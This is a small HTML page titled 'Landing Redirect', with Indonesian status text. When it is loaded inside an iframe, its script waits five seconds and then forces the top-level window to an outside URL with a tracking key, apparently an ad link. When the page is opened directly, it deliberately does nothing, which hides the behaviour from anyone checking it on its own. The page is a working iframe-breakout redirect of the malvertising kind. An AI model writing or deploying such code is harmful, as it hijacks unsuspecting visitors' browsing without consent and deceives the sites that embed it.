<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Landing Redirect</title>
</head>
<body>

<h1>landing-redirect</h1>
<p id="status">Script belum jalan</p>

<script>
(function () {

  document.getElementById("status").innerText = "Script loaded";

  // cek iframe
  if (window.self === window.top) {
    document.getElementById("status").innerText = "Direct open (NO redirect)";
    return;
  }

  document.getElementById("status").innerText = "Inside iframe, wait 5s";

  setTimeout(function () {
    document.getElementById("status").innerText = "Redirecting...";
    window.top.location.href = "https://oversightexcitement.com/bt6678xqp4?key=b4d6bb67a477268e22db1885ae26c970";
  }, 5000);

})();
</script>

</body>
</html>
